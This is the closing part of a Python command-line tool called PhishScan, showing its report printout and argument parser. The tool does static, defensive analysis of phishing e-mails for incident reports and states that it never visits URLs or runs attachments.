            sc = {"CRITICAL": "1;31", "HIGH": "31", "MEDIUM": "33"}.get(f["sev"], "37")
            print(f"  {C.c(sc, f['sev'][:4]):>4} +{f['pts']:<2} [{f['cat'][:6]}] {f['title'][:100]}")
    print("-" * 74)
    for w in written:
        print("  wrote", w)
    return an


def main():
    ap = argparse.ArgumentParser(description="PhishScan - safe static phishing e-mail analysis + report generator",
                                 formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__.split("Usage:")[1] if "Usage:" in __doc__ else "")
    ap.add_argument("files", nargs="*", help=".eml file(s) (or - for stdin)")
    ap.add_argument("--out", default="phish_report", help="output directory (default: phish_report)")
    ap.add_argument("--format", default="md,html,json", help="comma list: md,html,json (default all)")
    ap.add_argument("--case", help="case / ticket ID")
    ap.add_argument("--analyst", default="", help="analyst name")
    ap.add_argument("--reported-by", default="", help="user who reported the mail")
    ap.add_argument("--status", default="Open", help="Open / Contained / Closed")
    ap.add_argument("--clicked", action="store_true", help="user clicked a link")
    ap.add_argument("--creds", action="store_true", help="user entered credentials")
    ap.add_argument("--mfa", action="store_true", help="user approved an MFA prompt")
    ap.add_argument("--executed", action="store_true", help="user opened/executed an attachment")
    ap.add_argument("--targeted", action="store_true", help="target is exec/finance/admin (raises severity)")
    ap.add_argument("--online", action="store_true", help="DNS, RDAP domain age, VirusTotal, AbuseIPDB (never fetches the phishing URLs)")
    ap.add_argument("--vt-key", help="VirusTotal API key (or env VT_API_KEY)")
    ap.add_argument("--abuse-key", help="AbuseIPDB API key (or env ABUSEIPDB_API_KEY)")
    ap.add_argument("--save-attachments", action="store_true", help="save attachments as <sha256>.bin in OUT/attachments (handle with care)")
    ap.add_argument("--no-color", action="store_true")
    ap.add_argument("--verbose", "-v", action="store_true")
    ap.add_argument("--make-sample", metavar="FILE", help="write a harmless sample phishing .eml and exit")
    args = ap.parse_args()
    if args.no_color:
        C.on = False
    if args.make_sample:
        make_sample(args.make_sample)
        return
    if not args.files:
        ap.print_help()
        sys.exit(1)
    print(C.c("1;36", f"PhishScan {VERSION}") + " - static analysis only; URLs are never visited and attachments never executed.")
    for f in args.files:
        if f != "-" and not os.path.exists(f):
            print(f"[!] not found: {f}")
            continue
        analyze_one(f, args)


if __name__ == "__main__":
    main()
